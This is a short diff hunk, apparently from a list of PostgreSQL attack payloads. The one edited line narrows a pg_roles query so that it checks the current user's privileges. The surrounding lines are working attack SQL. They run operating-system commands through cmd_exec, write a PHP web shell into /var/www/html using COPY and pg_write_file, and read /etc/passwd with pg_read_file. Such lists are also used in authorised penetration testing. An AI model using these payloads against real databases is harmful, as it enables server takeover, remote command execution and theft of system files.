@@ -28,7 +28,7 @@ SELECT cmd_exec('ls /');
 
 COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
 SELECT encode(pg_read_file('/etc/passwd'), 'base64');
-SELECT * FROM pg_roles;
+SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;
 SELECT * FROM pg_foreign_server;
 SELECT pg_write_file('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>');
 SELECT pg_read_file('/etc/passwd', 0, 1000);
